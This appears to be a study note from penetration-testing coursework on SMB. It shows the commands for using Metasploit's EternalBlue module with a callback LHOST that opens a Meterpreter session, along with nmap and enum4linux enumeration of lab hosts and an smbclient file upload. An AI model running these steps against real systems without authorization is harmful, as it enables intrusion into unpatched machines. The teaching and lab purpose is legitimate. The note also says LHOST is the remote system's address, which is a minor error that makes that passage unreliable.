## SMB Exploits
As you learned in the previous section, SMB has historically suffered from numerous catastrophic vulnerabilities. You can easily see this by just exploring the dozens of well-known exploits in the Exploit Database (exploit-db.com) by using the searchsploit command.

One of the most commonly used SMB exploits in recent times has been the EternalBlue exploit, which was leaked by an entity called the Shadow Brokers that allegedly stole numerous exploits from the U.S. National Security Agency (NSA). Successful exploitation of EternalBlue allows an unauthenticated remote attacker to compromise an affected system and execute arbitrary code. This exploit has been used in ransomware such as WannaCry and Nyeta. This exploit has been ported to many different tools, including Metasploit.

The `use exploit/windows/smb/ms17_010_eternalblue` command is invoked to use the EternalBlue exploit. Then the **show options** command is used to show all the configurable options for the EternalBlue exploit. At a very minimum, the IP address of the remote host (RHOST) and the IP address of the host that you would like the victim to communicate with after exploitation (LHOST) must be configured. To configure the RHOST, you use the **set RHOST** command followed by the IP address of the remote system (**10.1.1.2** in this example). To configure the LHOST, you use the **set LHOST** command followed by the IP address of the remote system (**10.10.66.6** in this example). The remote port (445) is already configured for you by default. After you run the **exploit** command, Metasploit executes the exploit against the target system and launches a Meterpreter session to allow you to control and further compromise the system. Meterpreter is a post-exploitation tool; it is part of the Metasploit framework.

## Scanning for SMB Vulnerabilities with enum4linux
#### 1. Use [[Nmap]] to find SMB servers
By enumerating open ports. Common open ports on SMB servers are:
TCP 135           RPC
TCP 139           NetBIOS Session
TCP 389           LDAP Server
TCP 445           SMB File Service
TCP 9389          Active Directory Web Services
TCP/UDP 137   NetBIOS Name Service
UDP 138           NetBIOS Datagram

- `nmap -sN 172.17.0.0/24`
#### 2. Use [[enum4linux]] to enumerate users and network file shares
- List the users configured on the target 172.17.0.2 : `enum4linux -U 172.17.0.2` (metasploitable.vm)
- List the file shares available on 172.17.0.2 : `enum4linux -Sv 172.17.0.2` 
- list the password policies : `enum4linux -P 172.17.0.2`
- quickly perform multiple SMB enumeration operations in one scan using the **-a** argument : `enum4linux -a 10.6.6.23` (gravemind.vm)
#### 3. Use smbclient to transfer files between systems
Smbclient is a component of Samba that can store and retrieve files, similar to an FTP client. You will use smbclient to transfer a file to the target system at 172.17.0.2. This simulates exploiting a network host with malware through an SMB vulnerability.

1. Create a text file using the **cat** command. Name the file **badfile.txt**. Enter the desired text. In this example, **This is a bad file.** was used. Be sure that you know the path to the file. Press **CTRL-C** to when finished.
	`cat >> badfile.txt`
2. Use the **smbclient -L** command to list the shares on the target host. This command produces a similar output to what the enum4linux command did in Part 2. When asked for a password, press enter. The double / character before the IP address and the / following it are necessary if the target is a Windows computer.
	 `smbclient -L //172.17.0.2/`
3. Connect to the **tmp** share using the **smbclient** command by specifying the share name and IP address.
	`smbclient //172.17.0.2/tmp`
	Note that the prompt changed to the **smb:>** prompt. Type `help` to see what commands are available.
4. Enter `dir` to view the contents of the share.
5. Upload the `badfile.txt` to the target server using the `put` command. The syntax for the command is: 
	`put local-file-name remote-file-name`
6. Verify that the file successfully uploaded using the `dir` command.
7. Type `quit` to exit the smbclient and return to the CLI prompt.

 